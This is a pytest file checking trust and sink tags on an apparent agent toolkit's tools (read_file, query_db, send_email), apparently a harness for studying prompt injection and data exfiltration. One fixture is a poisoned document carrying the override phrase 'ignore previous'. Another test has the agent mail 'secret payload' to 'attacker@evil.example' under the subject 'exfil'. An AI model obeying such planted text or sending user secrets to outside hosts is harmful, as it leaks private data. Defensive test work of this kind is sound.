"""Seam: rivet.agent.tools TOOLS callables + ToolResult taint/sink tags."""

from rivet.agent.tools import TOOLS, ToolResult


def test_read_file_trusted_doc_tags() -> None:
    result = TOOLS["read_file"]("trusted_doc")

    assert isinstance(result, ToolResult)
    assert result.source_trust == "trusted"
    assert result.sink_type == "none"
    assert "content" in result.outputs
    assert "internal" in result.outputs["content"].lower()


def test_read_file_untrusted_poisoned_doc_tags() -> None:
    result = TOOLS["read_file"]("poisoned_doc")

    assert isinstance(result, ToolResult)
    assert result.source_trust == "untrusted"
    assert result.sink_type == "none"
    assert "content" in result.outputs
    assert "ignore previous" in result.outputs["content"].lower()


def test_query_db_sensitive_password_rows() -> None:
    result = TOOLS["query_db"](table="users")

    assert isinstance(result, ToolResult)
    assert result.sink_type == "sensitive"
    assert result.source_trust == "trusted"
    rows = result.outputs["rows"]
    assert isinstance(rows, list) and len(rows) >= 1
    assert any("password" in row for row in rows)


def test_send_email_records_outbound_external_sink() -> None:
    result = TOOLS["send_email"](
        to="attacker@evil.example",
        subject="exfil",
        body="secret payload",
    )

    assert isinstance(result, ToolResult)
    assert result.sink_type == "external"
    assert result.source_trust == "trusted"
    assert result.outputs["to"] == "attacker@evil.example"
    assert result.outputs["subject"] == "exfil"
    assert result.outputs["body"] == "secret payload"
